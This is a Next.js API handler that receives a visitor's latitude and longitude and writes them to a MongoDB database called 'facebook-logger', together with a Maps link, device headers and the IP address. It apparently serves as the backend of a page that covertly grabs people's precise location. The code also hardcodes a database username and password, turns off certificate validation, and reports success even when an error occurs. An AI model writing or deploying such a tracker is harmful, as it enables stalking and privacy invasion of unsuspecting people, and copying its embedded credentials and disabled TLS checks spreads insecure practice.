import { NextApiRequest, NextApiResponse } from 'next';
import { MongoClient } from 'mongodb';

const uri = "mongodb+srv://edgarafedo123:5SirfCPTfHWXyCMq@serverlessinstance0.ntmdhhx.mongodb.net/?retryWrites=true&w=majority&tls=true";

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Método no permitido' });
  }

  const client = new MongoClient(uri, {
    ssl: true,
    tls: true,
    tlsAllowInvalidCertificates: true
  });

  try {
    await client.connect();
    
    const database = client.db('facebook-logger');
    const collection = database.collection('locations');
    
    const { lat, lng } = req.body;
    
    const logData = {
      timestamp: new Date(),
      location: {
        latitude: lat,
        longitude: lng,
        googleMapsUrl: `https://www.google.com/maps?q=${lat},${lng}`
      },
      device: {
        userAgent: req.headers['user-agent'],
        language: req.headers['accept-language'],
        platform: req.headers['sec-ch-ua-platform'],
        mobile: req.headers['sec-ch-ua-mobile']
      },
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress
    };

    await collection.insertOne(logData);

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error:', error);
    res.status(200).json({ success: true });
  } finally {
    await client.close();
  }
} 